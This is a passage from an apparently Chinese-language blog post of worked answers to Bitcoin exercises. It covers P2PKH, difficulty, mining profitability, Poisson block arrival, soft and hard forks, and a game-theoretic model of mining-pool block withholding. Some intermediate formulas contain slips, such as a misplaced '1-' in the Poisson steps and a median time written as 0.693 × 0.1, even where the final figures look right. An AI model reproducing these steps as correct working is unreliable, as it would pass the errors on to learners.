bit\)</span>的公钥哈希,但<code>P2PK</code>使用<span class="math inline">\(257 \bits\)</span>的压缩公钥。 另外虽然<code>P2PKH</code>有<spanclass="math inline">\(4\)</span>个操作符<code>OP</code>,而<code>P2PK</code>只有<span class="math inline">\(1\)</span>个,但由于每个操作符<code>OP</code>只占用<span class="math inline">\(1 \bytes = 8 bits\)</span>,那么<code>P2PKH</code>的操作符<code>OP</code>只多占用了<spanclass="math inline">\((4 * 8) - (1 * 8) = 24 \ bits\)</span>。 相比<spanclass="math inline">\(257 - (160+24) = 73 \ bits\)</span>,<code>P2PKH</code>仍然节省了<span class="math inline">\(73 \bits\)</span>。 那么<code>P2PK2</code>将有更小的UTXO集合。因此,当目标是最小化 UTXO 集的大小时,首选<code>P2PKH</code>。这也意味着发件人只需知道公钥的 <spanclass="math inline">\(160 \ bits\)</span>的<strong>公钥哈希</strong>即可进行汇款, 因此更容易通过 QR码等方式将这些地址发布在网站上。</p><p><strong>安全优势</strong>: 公钥哈希,可以保证在<code>P2PKH</code>的<code>UTXO</code>没有被使用完之前公钥不易被揭露。并且攻击者只很少的时间尝试(例如使用量子计算机)获得公钥。通常在一笔交易被确认钱(6个区块,1小时)的时间窗口内, 攻击者无法破解<strong>公钥哈希</strong>。</p></blockquote><h2 id="bitcoin-difficulty-比特币难度参数">8.Bitcoin Difficulty比特币难度参数</h2><p><strong>8.1</strong>: 如果网络的<strong>Hash Rate哈希速率</strong>(总算力)稳定在<span class="math inline">\(1.65*10^{20}\ Hash/second\)</span>, 那么找块的难度是多少?将难度表示为在找到一个区块之前的<u>期望</u>的<strong>Mining Trials采矿试验</strong>次数。</p><blockquote><p>首先比特币希望将出块间隔稳定在<span class="math inline">\(600 \s\)</span>一个。</p><p>那么我们只需要通过<strong>Hash Rate哈希速率</strong>乘以<u>期望间隔</u>就能得到期望的哈希操作次数: <spanclass="math inline">\(1.65(10^{20}) * 600 = 9.9(10^{22}) \\ =\log_{2}(9.9(10^{22})) \\ \approx 2^{76.4}\)</span></p></blockquote><p><strong>8.2</strong>: 如果难度稳定在<spanclass="math inline">\(2^{75.5}\)</span>, 网络的<strong>Hash Rate哈希速率</strong>(总算力)是多少</p><blockquote><p>反算: <span class="math inline">\(\frac{2^{75.5}}{600} \approx8.9(10^{19}) \ H/s\)</span></p></blockquote><p><strong>8.3</strong>: 比特币难度参数每两周调整一次, 假设当前难度为<span class="math inline">\(2^{74.02}\)</span> 并且在<spanclass="math inline">\(12.5\)</span>天内发现了 <spanclass="math inline">\(2016\)</span>个区块。那么重新计算后会难度参数是多少?</p><blockquote><p>首先每2016块更新一次难度(平均2周), 那么根据公式: <spanclass="math inline">\(过去难度 * \frac{14天}{过去耗时}\)</span></p><p>我们可以计算: <span class="math inline">\(2^{74.02} * \frac{14}{12.5}\approx 2.15(10^{22}) \\ \approx \log_2({2.15(10)^{22})} \\ \approx2^{74.18}\)</span></p></blockquote><h2 id="bitcoin-mining-economics-比特币开采经济学">9.Bitcoin MiningEconomics 比特币开采经济学</h2><p>假设您正在考虑使用新的 <ahref="https://canaan.io/product/avalonminer-1166-pro">Canaan AvalonA1166 Pro</a> 开采比特币。该设备的额定执行速度为 <spanclass="math inline">\(81 \ TH/s\)</span>(每秒 <spanclass="math inline">\(81×10^{12}\)</span> 次哈希), 需要 <spanclass="math inline">\(3.4 \ kW\)</span> 的功率才能运行。假设您的电力公司的账单为 <span class="math inline">\(0.10 \USD/kWh\)</span>, 当前难度为 <spanclass="math inline">\(2^{76.3}\)</span>, 找到一个区块的平均奖励为 <spanclass="math inline">\(420,000\)</span> 美元(这些值在 2021 年 11月开始时是准确的, 当时采矿奖励处于峰值)。</p><p><strong>9.a</strong>:根据以上已知条件需要多长时间才能找到一个区块?</p><blockquote><ul><li><strong>难度参数</strong>: 整个网络需要平均<spanclass="math inline">\(2^{76.3}\)</span>次哈希计算出Mining Puzzle,那么每个矿工平均也需要<spanclass="math inline">\(2^{76.3}\)</span>次哈希计算才能计算出Puzzle</li><li><strong>算力</strong>: 每秒<spanclass="math inline">\(81(10^{12})\)</span>次哈希</li><li>那么需要<spanclass="math inline">\(\frac{2^{76.3}}{81(10^{12})}=1148427676.67204\approx 1148427677 \ seconds\)</span></li><li>我们知道根据<strong>Unix时间</strong>, 一个月有<spanclass="math inline">\(2629743 \ seconds\)</span></li><li>那么将需要<span class="math inline">\(\frac{1148427677}{2629743} =436.707 \approx 437 \ month\)</span>才能开采出一个区块</li></ul></blockquote><p><strong>9.b</strong>: 使用您对<strong>9.1</strong>的答案,计算月收入是多少?</p><blockquote><ul><li>一个<strong>区块奖励</strong>为: <span class="math inline">\(420,000\ USD\)</span></li><li>那么挖矿一个月收益为: <spanclass="math inline">\(\frac{420,000}{437} \approx 961 \USD\)</span></li></ul></blockquote><p><strong>9.c</strong>: 计算每个月销好的电费是多少</p><blockquote><ul><li>矿机需要<span class="math inline">\(3.4 \kW\)</span>的电才能运行</li><li>每小时电费需要: <span class="math inline">\(0.1 \USD/kWh\)</span></li><li>每个月电费为: <span class="math inline">\(0.1 * 24 \ hours*(\frac{365}{12})\ day = 73 \ USD/ kWm\)</span></li><li>那么矿机运行一个月需要: <span class="math inline">\(3.4 \ kW * 73 \USD/kWm \approx 248 \ USD\)</span></li></ul></blockquote><p><strong>9.d</strong>: 网络<strong>难度参数</strong>为多少时,该矿机能够达到收支平衡(月电费 = 预期月收入)?</p><blockquote><ul><li>已知挖矿奖励为<span class="math inline">\(420,000 \USD\)</span></li><li>每月电费约为<span class="math inline">\(248 \ USD\)</span></li><li>矿机算力为固定每秒<spanclass="math inline">\(81(10^{12})\)</span>次哈希</li><li>我们设<strong>难度参数</strong>为:<spanclass="math inline">\(d\)</span>, 则开采出一个区块需要: <spanclass="math inline">\(\frac{d}{81(10^{12})} \ seconds\)</span></li><li>那么我们需要保证每个月用平摊所得的挖矿收益<spanclass="math inline">\(\frac{420,000}{出块时间 \month}\)</span>至少等于平均耗电量<span class="math inline">\(248 \USD\)</span>以达到收支平衡: <spanclass="math inline">\(\frac{420,\:000}{\frac{\left(\frac{d}{81\left(10^{12}\right)}\right)}{2629743}}=248 \ USD/month\)</span><ul><li><span class="math inline">\(d ={\color{green}{2^{78.25}}}\)</span></li></ul></li><li>所以需要<strong>难度参数</strong>为<spanclass="math inline">\({\color{green}{2^{78.25}}}\)</span>才能达到每月的收支平衡 (收支平衡点),也就是说只有在难度参数低于收支平衡点的时候(例如<spanclass="math inline">\(2^{78} &lt; 2^{78.25}\)</span>),使用该矿机挖矿才能达到收支平衡。</li></ul></blockquote><p><strong>9.e</strong>: 假设除<strong>难度参数</strong>每月增加<spanclass="math inline">\(5.5\%\)</span>以外, 其他所有因素保持不变,多久后该的矿机将无法实现盈利?</p><blockquote><ul><li>每月增长率为<span class="math inline">\(1+1(5.5\%) =1.055\)</span></li><li>当前<strong>难度参数</strong>为: <spanclass="math inline">\({\color{orange}{2^{76.3}}}\)</span></li><li><strong>难度参数</strong>在: <spanclass="math inline">\({\color{green}{ 2^{78.25}}}\)</span>时达到收支平衡点</li><li>那么设需要经过的月份数为:<span class="math inline">\(m\)</span>,那么需要经过<span class="math inline">\(1.055^{m} = 2^{78.25-76.3}\approx 25.25 \ month\)</span> 达到收支平衡点。</li></ul></blockquote><p><strong>9.f</strong>: 考虑到该矿机的收入将持续下降,矿机在关闭之前的生命周期内的期望利润是多少?</p><blockquote><ul><li>根据<strong>9.b</strong>已知该矿机当前月收益为: <spanclass="math inline">\(961 \ USD\)</span></li><li>根据<strong>9.c</strong>已知该矿机每月耗电量为: <spanclass="math inline">\(248 \ USD\)</span></li><li>根据<strong>9.e</strong>已知该矿机当前距收支平衡点还有: <spanclass="math inline">\(25.3 \ month\)</span></li><li>并且我们已知难度逐月递增<span class="math inline">\(105.5\%\)</span>, 那么相对收益也会以逐月衰减<span class="math inline">\(105.5\%\)</span>的。</li><li>那么我们需要计算从当前 <span class="math inline">\(961 \USD\)</span> 每月经过<span class="math inline">\(25.3 \ month\)</span>的时间内每月收益以<span class="math inline">\(105.5\%\)</span>的递减后的总和, 并每月需要减去<span class="math inline">\(248\ USD\)</span>的电费成本。</li><li><span class="math inline">\(\int_0^{25.3}\left(961\cdot1.055^{-t}-248\right) = 7042.715\)</span><ul><li><ahref="https://www.wolframalpha.com/input?i=integral_0%5E25.3+%28961%C3%971.055%5E%28-t%29+-+248%29">wolframalpha</a>:<code>integral_0^25.3 (961×1.055^(-t) - 248)(metric decitons)</code></li><li><ahref="https://zs.symbolab.com/solver/step-by-step/%5Cint_%7B0%7D%5E%7B25.3%7D%5Cleft(961%5Ccdot%201.055%5E%7B-t%7D-248%5Cright)?or=input">symbolab</a>:<code>\int _0^&#123;25.3&#125;\left(961\cdot 1.055^&#123;-t&#125;-248\right)</code></li></ul></li></ul><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206011814558.jpg" alt="mining_profit_25.3" style="zoom:30%;" /></p><ul><li>所以该矿机在剩下的25.3个月内期望利润为: <spanclass="math inline">\(7043 \ USD\)</span></li></ul></blockquote><p><strong>9.g</strong>: 假设您能够投资每月复合回报率为 <spanclass="math inline">\(0.8\%\)</span> 的<strong>Wide-Market Index广泛市场指数</strong> ETF, 那么以什么价格购买采矿设备,它不再发布项好的投资? 将此与该矿机 <span class="math inline">\(10,000 \USD\)</span> 的市场价格进行比较。</p><blockquote><ul><li>回报率为<span class="math inline">\(0.8%\)</span>,那么<strong>Present Value 现值 (PV)</strong>乘以月回报率<spanclass="math inline">\(0.8\%\)</span>等于<strong>Future Value 未来值(FV)</strong>: <span class="math inline">\(FV = PV *1.008^{-t}\)</span></li><li>那么反之: <span class="math inline">\(PV = FV *1.008^{-t}\)</span></li><li>计算最高可接受的购买价格为: <spanclass="math inline">\(\int_0^{25.3} 1.008^{-t}\left(961\cdot1.055^{-t}-248\right) = {\color{green}{6645.757}}\)</span></li><li>那么相比<span class="math inline">\(10,000 \USD\)</span>的价格是过高的, 并不是一个好的投资(只有在低于<spanclass="math inline">\(6,646 \USD\)</span>以下的价格购买才是一笔好的投资)。</li></ul></blockquote><p><strong>9.h</strong>: 这是一项好的投资吗?该分析忽略了哪些其他因素?</p><blockquote><p>很显然不是一笔好的投资。</p><p><strong>忽略因素</strong>: 首先<span class="math inline">\(10,000 \USD\)</span>的矿机(<ahref="https://canaan.io/product/avalonminer-1166-pro">Canaan AvalonA1166 Pro</a>)是被高估的, 并且<span class="math inline">\(420,000 \USD\)</span>的挖矿奖励对标的是比特币兑换美元的一个峰值<strong>汇率</strong>。另外<strong>挖矿奖励</strong>将在每21万区块(大约4年)减半一次。同样的<strong>交易费</strong>并没有被考虑。还有,<strong>电力成本</strong>的变化、<strong>挖矿差异</strong>、潜在的<strong>矿池费用</strong>、潜在的未来法律法规以及作为矿工的道德成本是需要考虑的一些事情。</p><p>(截至2022年3月, 区块奖励为 <span class="math inline">\(250000 \USD\)</span>, 难度参数为: <spanclass="math inline">\(2^{76.6}\)</span>。</p></blockquote><h2 id="bitcoin-block-arrival-time-比特币区块到达时间">10.Bitcoin BlockArrival Time 比特币区块到达时间</h2><p>回想一下, 比特币区块的到达是一个<strong>Poission Process泊松过程</strong>, <u>Rate 速率</u>: <span class="math inline">\(r=0.1 \minutes^{-1}\)</span>。这意味着无论距离上一个区块被发现已经过去了多长时间,在任何时刻找到一个区块的平均时间是 <span class="math inline">\(10 \minutes\)</span>。</p><p><strong>10.a</strong>: 计算在接下来的 10分钟内至少找到一个区块的概率是多少?</p><blockquote><p><strong>Probability Mass Function 概率质量函数 (PMF)</strong>： 是<ahref="https://zh.wikipedia.org/wiki/离散随机变量">离散随机变量</a>在各特定取值上的概率。</p><p>首先柏松公式: <span class="math inline">\(Pr(k, t) = \frac{(rt)^{k}e^{-rt}}{k!}\)</span></p><ul><li><span class="math inline">\(k\)</span>: 区块数</li><li><span class="math inline">\(t\)</span>: 时间段 = <spanclass="math inline">\(10 \ minutes\)</span></li><li><span class="math inline">\(r\)</span>: 发生率 = <spanclass="math inline">\(0.1 \ minutes^{-1}\)</span></li></ul><p>本题求: 至少找到一个区块的概率, 即<span class="math inline">\(k \geq1\)</span>的情况, 所以可以通过<spanclass="math inline">\(1-Pr(k=0,t)\)</span>的情况得到。</p><ul><li><span class="math inline">\(1-Pr(k=0, t=10 \ minutes) =\frac{(0.1*10)^{0}e^{-(0.1*10)}}{0!} \\ = 0.632121 \\ \approx0.63\)</span></li><li><ahref="https://www.wolframalpha.com/input?i2d=true&amp;i=1-PDF%5C%2891%29PoissonDistribution%5C%2891%291%5C%2893%29%5C%2844%29+0%5C%2893%29">Wolframalpha</a>:<code>1-PDF[PoissonDistribution[1], 0]</code></li></ul></blockquote><p><strong>10.b</strong>: 计算在接下来的 60 分钟内恰好找到 6个区块的概率是多少?</p><blockquote><ul><li><span class="math inline">\(t = 60 \ minutes\)</span></li><li><span class="math inline">\(1-Pr(k=6, t = 60 minutes) =\frac{(0.1*60)^{6}e^{-0.1*60}}{6!} \\ =0.160623 \\ \approx0.16\)</span></li><li><ahref="https://www.wolframalpha.com/input?i2d=true&amp;i=PDF%5C%2891%29PoissonDistribution%5C%2891%296%5C%2893%29%5C%2844%296%5C%2893%29">Wolframalpha</a>:<code>PDF[PoissonDistribution[6],6]</code></li></ul></blockquote><p><strong>10.c</strong>: 计算在接下来的 60 分钟内找到 6个或更多的概率是多少?</p><blockquote><ul><li><span class="math inline">\(t = 60 \ minutes\)</span></li><li><span class="math inline">\(k \geq 6\)</span>, 排除掉<spanclass="math inline">\(k \leq 5\)</span>的情况, 即<spanclass="math inline">\(1 - \sum_{k=0}^{5}(Pr(k, t=60 \ minutes)) \\ =0.55432 \\ \approx 0.55\)</span></li><li><ahref="https://www.wolframalpha.com/input?i=1-Sum%5BPDF%5BPoissonDistribution%5B6%5D%2C+k%5D%2C%7Bk%2C0%2C5%7D%5D">Wolframalpha</a>:<code>1-Sum[PDF[PoissonDistribution[6], k],&#123;k,0,5&#125;]</code></li></ul></blockquote><p><strong>10.d</strong>: 等待找到下一个区块的<em>Median中位</em>时间是多少? 那么找到6个区块的<em>Median中位</em>时间又是多少?</p><p>换一种说法: 要求概率是<span class="math inline">\(50\%\)</span>, 对于<span class="math inline">\(t\)</span> 的值, 您在<spanclass="math inline">\(t\)</span>分钟内找到至少一个块<spanclass="math inline">\(k \geq 1\)</span>（或在<spanclass="math inline">\(t\)</span>分钟内至少<span class="math inline">\(k\geq 6\)</span>个块）</p><blockquote><ol type="1"><li>现在反过要求概率<span class="math inline">\(Pr(k \geq 1, t) =0.5\)</span>来求时间<span class="math inline">\(t\)</span><ul><li>即: <span class="math inline">\(1 - Pr(k=0, (0.1t)) =\frac{(0.1t)^0e^{-0.1t}}{0!} = 0.5 \\ t = 0.693147 * 0.1 \\ t \approx6.9\)</span></li><li><ahref="https://www.wolframalpha.com/input?i=1-PDF%5BPoissonDistribution%5Bt%5D%2C+0%5D+%3D+0.5">Wolframalpha</a>:<code>1-PDF[PoissonDistribution[t], 0] = 0.5</code></li></ul></li><li>同样的要求概率<span class="math inline">\(Pr(k \geq 6, t) =0.5\)</span>来求时间<span class="math inline">\(t\)</span><ul><li>即: <span class="math inline">\(1 - \sum_{k=0}^{5}Pr(k, (0.1t)) =\frac{(0.1t)^ke^{-0.1t}}{k!} = 0.5 \\ t = 5.67016 * 0.1 \\ t \approx56.7\)</span></li><li><ahref="https://www.wolframalpha.com/input?i=1-Sum%5BPDF%5BPoissonDistribution%5Bt%5D%2C+k%5D%2C%7Bk%2C0%2C5%7D%5D+%3D+0.5">Wolframalpha</a>:<code>1-Sum[PDF[PoissonDistribution[t], k],&#123;k,0,5&#125;] = 0.5</code></li></ul></li></ol></blockquote><h2 id="soft-hard-forks-软硬分叉">11.Soft &amp; Hard forks 软硬分叉</h2><p>下哪些更改需要软分叉? 那些需要硬分叉?</p><p><strong>11.a</strong>: 要求每个区块都包含政府颁发的证书,声称它是使用可再发布源开采的</p><blockquote><p>软分叉: 旧的客户端可以户忽略新的证书, 依然可以正常验证区块。</p></blockquote><p><strong>11.b</strong>: 将区块奖励计划更改为永远固定在 6.25 BTC</p><blockquote><p>硬分叉: "中本聪规定:比特币每产生210,000个区块后奖励将减半一次,直至2140年出块奖励为0", 旧客户端会按照规定进行减半,如果新的区块不进行减半保留6.25的BTC奖励,那么其他按照规定的区块(奖励不是6.25BTC)不会同意获得⼀个6.25的BTC奖励。届时将需要硬分叉。</p></blockquote><p><strong>11.c</strong>: 要求每个矿工在每个区块中向比特币发展基金捐赠 1个比特币</p><blockquote><p>软分叉: 只是增加了一笔额外强制的交易(Tx),新旧区块都可以正常处理它。</p></blockquote><p><strong>11.d</strong>: 禁止除了 coinbase 之外没有交易的“空"块</p><blockquote><p>软分叉: 禁止无交易(Tx)区块, 对⽼区块⼉不会有不影响。</p></blockquote><p><strong>11.e</strong>: 在脚本中添加对 SHA-3哈希函数的支持（替换未使用的操作码）</p><blockquote><p>硬分叉: 如果 SHA-3 将某些值推送到堆栈上, 导致脚本(BitcoinScript)的执行行为不同, 那么新旧客户端之间可能会出现分歧,届时将需要进行硬分叉。</p></blockquote><p><strong>11.f</strong>: 取消每个区块 20,000 个签名的限制</p><blockquote><p>硬分叉: 如果新的区块有超过<spanclass="math inline">\(20,000\)</span>个签名,那么久的客户端由于签名上限的限制而无法接受新区块,届时需要发起硬分叉。</p></blockquote><p><strong>11.g</strong>: 将块频率更改为每 5 分钟一次</p><blockquote><p>硬分叉: 由于<strong>难度参数</strong>是根据产出<spanclass="math inline">\(2016\)</span>个区块所需的时间(<spanclass="math inline">\(过去难度 *\frac{14天}{本次找到2016个区块耗时}\)</span>)计算的,所以新客户端&amp;老客户端所产生的<strong>难度参数</strong>将不同。所以会发生分歧,互不兼容, 届时需要发起硬分叉。</p></blockquote><h2 id="mining-pool-sabotage-蓄意破坏矿池">12.Mining Pool Sabotage蓄意破坏矿池</h2><p>回想一下, 矿池使个体矿工能够分担风险和回报, 降低他们收益的差异,同时保持相同的预期价值。参与者可以通过反复提交<u>Shares</u>（有效但<strong>难度</strong>较低的块）以证明他们正在做多少工作。每当矿池找到一个区块时,该区块的 coinbase就会根据提交的<u>Shares</u>数量在参与者之间分配。一种风险是<strong>Sabotage蓄意破坏</strong>, 其中参与者提交<u>Shares</u>, 但如果自己找到了新区块,则拒绝提供完整的解决方案(自己独吞出块奖励)。</p><!--${\color{red}{P_1}}$--><!--${\color{red}{\alpha_1}}$--><!--${\color{red}{\beta_1}}$--><!--${\color{green}{P_2}}$--><!--${\color{green}{\alpha_2}}$--><p><strong>12.a</strong>: 考虑两个矿池:<spanclass="math inline">\({\color{red}{P_1}}\)</span>&amp;<spanclass="math inline">\({\color{green}{P_2}}\)</span>,分别具有算力<spanclass="math inline">\({\color{red}{\alpha_1}}\)</span>和<spanclass="math inline">\({\color{green}{\alpha_2}}\)</span>。</p><p>如果<span class="math inline">\({\color{red}{P_1}}\)</span>将<spanclass="math inline">\({\color{red}{\beta_1}} \lt{\color{red}{\alpha_1}}\)</span>的力量用于<strong>Sabotage蓄意破坏</strong><spanclass="math inline">\({\color{green}{P_2}}\)</span>, 那么从长远来看,<spanclass="math inline">\({\color{red}{P_1}}\)</span>在总收益中的<u>预期份额</u>是多少?请注意, 当<spanclass="math inline">\({\color{red}{P_1}}\)</span>找到一个块时,它会获得整个<strong>Coinbase 铸币交易</strong>。当<spanclass="math inline">\({\color{green}{P_2}}\)</span>找到一个区块时, <spanclass="math inline">\({\color{red}{P_1}}\)</span>会收到与<spanclass="math inline">\({\color{red}{P_1}}\)</span>为<spanclass="math inline">\({\color{green}{P_2}}\)</span>挖矿时产生的<u>Shares分红</u>数量成正比的一部分<strong>Coinbase 铸币交易</strong>。</p><blockquote><p>简单来说就是:</p><ol type="1"><li>如果<span class="math inline">\({\color{red}{P_1}}\)</span>找到区块,<spanclass="math inline">\({\color{red}{P_1}}\)</span>将自己独吞出块儿奖励(<strong>Coinbase铸币交易</strong>)。</li><li><span class="math inline">\({\color{green}{P_2}}\)</span>找到区块,<spanclass="math inline">\({\color{red}{P_1}}\)</span>将从中抽成(因为<spanclass="math inline">\({\color{red}{P_1}}\)</span>拿出了一小部分<spanclass="math inline">\({\color{red}{\beta_1}}\)</span>算力用于获得在<spanclass="math inline">\({\color{green}{P_2}}\)</span>中的<u>Shares分红</u>)。</li></ol><p>那么可以看出<spanclass="math inline">\({\color{green}{P_2}}\)</span>现在的总算里是: <spanclass="math inline">\({\color{green}{\alpha_2}} +{\color{red}{\beta_1}}\)</span>, 但是显然<spanclass="math inline">\({\color{red}{P_1}}\)</span>并不会真的使用<spanclass="math inline">\({\color{red}{\beta_1}}\)</span>的算力帮助<spanclass="math inline">\({\color{green}{P_2}}\)</span>挖矿, 所以其实<spanclass="math inline">\({\color{green}{P_2}}\)</span>的算力还是只有<spanclass="math inline">\({\color{green}{\alpha_2}}\)</span>那么多而已。</p><p>所以我们可以说, 其实<spanclass="math inline">\({\color{red}{\beta_1}}\)</span>这部分算力是不作为的,所以整个网络中真实会被用来挖矿的算力就只有<span class="math inline">\(1- {\color{red}{\beta_1}}\)</span>这么多。</p><p><em>放张简图方便理解</em>:</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206020204330.svg" alt="mining_pool_sabotage_drawio" style="zoom:150%;" /></p><p>那么对于整个网络来说:</p><ol type="1"><li><spanclass="math inline">\({\color{red}{P_1}}\)</span>的真实挖矿算力为 <spanclass="math inline">\(\frac{ {\color{red}{\alpha_1} }-{{\color{red}{\beta_1}} } }{ 1-{\color{red}{\beta_1} } }\)</span></li><li><spanclass="math inline">\({\color{green}{P_2}}\)</span>的真实挖矿算力为<span class="math inline">\(\frac{ {\color{green}{\alpha_2} } }{1-{\color{red}{\beta_1} } }\)</span></li><li><span class="math inline">\({\color{red}{P_1}}\)</span>通过 <spanclass="math inline">\({\color{red}{\beta_1}}\)</span><strong>Sabotage</strong> 获得的 <u>Shares 分红</u> 占比: <spanclass="math inline">\(\frac{ {\color{red}{\beta_1}} }{{\color{green}{\alpha_2} }+{\color{red}{\beta_1}} }\)</span></li></ol><p>那么我们可以得出 <spanclass="math inline">\({\color{red}{P_1}}\)</span> 在总收益中的<u>预期份额</u> 是: 在整个网络中 <spanclass="math inline">\({\color{red}{P_1}}\)</span> 自己的真实挖矿算力,加上 <span class="math inline">\({\color{red}{P_1}}\)</span> 通过 <spanclass="math inline">\({\color{red}{\beta_1}}\)</span><strong>Sabotage</strong> 从 <spanclass="math inline">\({\color{green}{P_2}}\)</span> 中获得的<u>Shares分红</u>: <span class="math inline">\(\frac{ {\color{red}{\beta_1}} }{{\color{green}{\alpha_2} }+{\color{red}{\beta_1}} } * \frac{{\color{green}{\alpha_2} } }{ 1-{\color{red}{\beta_1} } }\)</span>:</p><ul><li><span class="math inline">\({ {\frac{ {\color{red}{\alpha_1}}-{\color{red}{\beta_1}} }{ 1-{\color{red}{\beta_1} } } } \choose{\color{red}{P_1 挖矿收益} } } + { {\frac{ {\color{red}{\beta_1}} }{{\color{green}{\alpha_2} }+{\color{red}{\beta_1}} } }\choose{\color{red}{Sabotage\%} } } * { {\frac{ {\color{green}{\alpha_2} } }{1-{\color{red}{\beta_1} } } }\choose {\color{green}{P_2 挖矿收益} }}\)</span></li></ul></blockquote><p><strong>12.b</strong>: 在什么条件下<strong>Sabotage蓄意破坏</strong>攻击对<spanclass="math inline">\({\color{red}{P_1}}\)</span>有利, 给出具体数值?</p><blockquote><p>如果<span class="math inline">\({\color{red}{P_1}}\)</span>实施<strong>Sabotage 蓄意破坏</strong> 的总收益大于正常使用$ { }$的收益那么,我们就可以判定这个<strong>Sabotage蓄意破坏</strong>策略是有效且有意义的。</p><ul><li><p><span class="math inline">\({ {\frac{ {\color{red}{\alpha_1}}-{\color{red}{\beta_1}} }{ 1-{\color{red}{\beta_1} } } } \choose{\color{red}{P_1 挖矿收益} } } + { {\frac{ {\color{red}{\beta_1}} }{{\color{green}{\alpha_2} }+{\color{red}{\beta_1}} } }\choose{\color{red}{Sabotage\%} } } * { {\frac{ {\color{green}{\alpha_2} } }{1-{\color{red}{\beta_1} } } }\choose {\color{green}{P_2 挖矿收益} } }\gt { { {\color{red}{\alpha_{1} } } }\choose{ {\color{red}{P_1原本的总算力} } } }\)</span></p></li><li><p><ahref="https://www.wolframalpha.com/input?i2d=true&amp;i=Divide%5Ba_1+-+b%2C1-b%5D+%2BDivide%5Bb%2Ca_2+%2B+b%5D+Divide%5Ba_2%2C1-b%5D+%3E+a_1%5C%2844%29+b%3Ca_1">wolframalpha</a>:<code>Divide[a_1 - b,1-b] +Divide[b,a_2 + b] Divide[a_2,1-b] &gt; a_1, b&lt;a_1</code></p></li><li><p>得到: <span class="math inline">\({0 \lt \beta_1 \lt }1\)</span>,<span class="math inline">\({\alpha_1 \gt \beta_1}\)</span>, <spanclass="math inline">\({\color{green}{\alpha_2}} \gt{\color{red}{\frac{(\beta_1 - \alpha_1\beta_1)}{\alpha_1}}}\)</span></p></li><li><p>所以<spanclass="math inline">\({\color{red}{P_1}}\)</span>只有在<spanclass="math inline">\({\color{green}{\alpha_2}}\)</span>大于<spanclass="math inline">\({\color{red}{\frac{(\beta_1 - \alpha_1\beta_1)}{\alpha_1}}}\)</span>的前提下, 才能真正通过<strong>Sabotage蓄意破坏</strong>获利。</p></li><li><p>假设: <spanclass="math inline">\({\color{red}{P_1}}\)</span>拥有<spanclass="math inline">\({\color{red}{\alpha_1}} = 30 \%\)</span>的算力,并拿出<span class="math inline">\({\color{red}{\beta_1}} =1\%\)</span>的算力 <strong>Sabotage</strong> <spanclass="math inline">\({\color{green}{P_2}}\)</span>,那么通过上述公式计算</p><ul><li><span class="math inline">\({\color{green}{\alpha_2}} \gt{\color{red}{\frac{(1\% - 30 \% * 1\%)}{30 \%}}} \\{\color{green}{\alpha_2}} \gt {\color{red}{23.3 \%}}\)</span></li></ul></li><li><p>那么只要 <spanclass="math inline">\({\color{green}{P_{2}}}\)</span> 的算力<spanclass="math inline">\({\color{green}{\alpha_{2} \gt 23.3 \%}}\)</span>,那么<span class="math inline">\({\color{red}{P_1}}\)</span>就可以通过<strong>Sabotage</strong>策略获利。</p></li></ul></blockquote><p><strong>12.c</strong>: 假设 <spanclass="math inline">\({\color{green}{P_{2}}}\)</span>想要通过踢出有效块率低于报告<u>Shares</u>数量参与者来保护自己。这可能会无意中惩罚诚实的参与者。解释为什么。</p><blockquote><p><span class="math inline">\({\color{green}{P_{2}}}\)</span>可以通过参与者提交的<u>Shares</u>值可以计算出每个参与者基于其的哈希率提交的有效区块数的<u>期望值</u>,而这个期望值等于<u>Variance 方差</u>。</p><p>但是, 参与者开采到有效区块的数量, 是由<strong>Poisson Process柏松过程</strong>决定的。</p><p><strong>Poission Distribution 柏松分布</strong>的<u>Variance方差</u>与<u>Mean 平均数</u>是相等的。</p><p>而<strong>Poission Distribution 柏松分布</strong>的<u>Variance方差</u>又很大, 如果<spanclass="math inline">\({\color{green}{P_{2}}}\)</span>的<u>StatisticalSignificance Threshold 统计显着性阈</u>值不够低,诚实的成员也将会被踢出矿池 (<spanclass="math inline">\({\color{green}{P_{2}}}\)</span>可以根据<em>P-Values</em>、<em>Null-Hypothese</em>&amp; <em>Poisson CDF</em>来计算应该如何设定<u>Threshold 阈值</u>)。</p></blockquote><p><strong>12.d</strong>: 假设: <spanclass="math inline">\({\color{red}{\alpha_1}} ={\color{green}{\alpha_2}}\)</span>, 并相互 <strong>Sabotage</strong>(${} &lt; {} $ &amp; <spanclass="math inline">\({\color{green}{\beta_2}} {&lt;\color{green}{\alpha_2}}\)</span>), 且(${}={}={} $)两个池会那个算力区间内因相互攻击而损失收益? 他们会损失多少?这种情况是什么博弈论中的经典博弈的例子?</p><blockquote><p>那么对于整个网络来说:</p><ul><li>真实用来挖矿的算力就只有: <span class="math inline">\(1 -{\color{red}{\beta_1}} - {\color{green}{\beta_2}} \\ = 1-{\color{orange}{2 \beta}}\)</span></li><li><spanclass="math inline">\({\color{red}{P_1}}\)</span>的真实挖矿算力为 <spanclass="math inline">\(\frac{ {\color{red}{\alpha_1} }-{{\color{red}{\beta_1}} } }{ 1- {\color{orange}{2 \beta} }}\)</span></li><li><spanclass="math inline">\({\color{green}{P_2}}\)</span>的真实挖矿算力为<span class="math inline">\(\frac{ {\color{green}{\alpha_2} }-{{\color{green}{\beta_2}} } }{ 1- {\color{orange}{2 \beta} }}\)</span></li><li><span class="math inline">\({\color{red}{P_1}}\)</span>通过 <spanclass="math inline">\({\color{red}{\beta_1}}\)</span><strong>Sabotage</strong> 获得的 <u>Shares 分红</u> 占比: <spanclass="math inline">\(\frac{ {\color{red}{\beta_1}} }{{\color{green}{\alpha_2} }+{\color{red}{\beta_1}} -{\color{green}{\beta_2}} }\)</span></li><li><span class="math inline">\({\color{green}{P_2}}\)</span>通过 <spanclass="math inline">\({\color{green}{\beta_2}}\)</span><strong>Sabotage</strong> 获得的 <u>Shares 分红</u> 占比: <spanclass="math inline">\(\frac{ {\color{green}{\beta_2}} }{{\color{red}{\alpha_1} }+{\color{green}{\beta_2}} -{\color{red}{\beta_1}} }\)</span></li></ul><p>由于互相 <strong>Sabotage</strong> 所以 <u>Shares 分红</u>将会相互抵消。</p><p>最极端的情况是<spanclass="math inline">\({\color{red}{P_1}}\)</span>&amp;<spanclass="math inline">\({\color{green}{P_2}}\)</span>平分全网的算力, <spanclass="math inline">\({\color{red}{\alpha_1}} ={\color{green}{\alpha_2}} = 50 \%\)</span></p><p>那么这种情况下:</p><ol type="1"><li><span class="math inline">\({\color{red}{P_1}}\)</span>在<spanclass="math inline">\(\frac{ 